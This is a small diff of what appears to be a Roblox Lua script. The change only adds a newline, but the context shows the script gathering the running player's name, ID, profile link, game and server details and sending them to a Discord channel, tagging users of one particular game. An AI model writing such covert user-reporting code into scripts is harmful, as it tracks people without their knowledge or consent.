@@ -29,7 +29,7 @@ local profile = "https://www.roblox.com/users/"..plrid.."/profile"
 my_message = "Script Was Executed! Gotten info from user ("..profile..") :"..e.."Player Name: "..name..e..e.."Player ID: "..plrid..e..e.."Game ID: "..placeid..e..e.."Game Name: "..gamev..e..e.."Total Players Count: "..count..e..e.."Players On Server: "..plrsonserv..e..e.."JobID:"..game.JobId..e
 
 if tonumber(placeid) == tonumber("3431407618") then
-  my_message=my_message..e.."ISLE SCRIPT USER AHHHH"
+  my_message=my_message..e.."ISLE SCRIPT USER AHHHH"..e
 else 
 end
 send_discord_message(my_message)
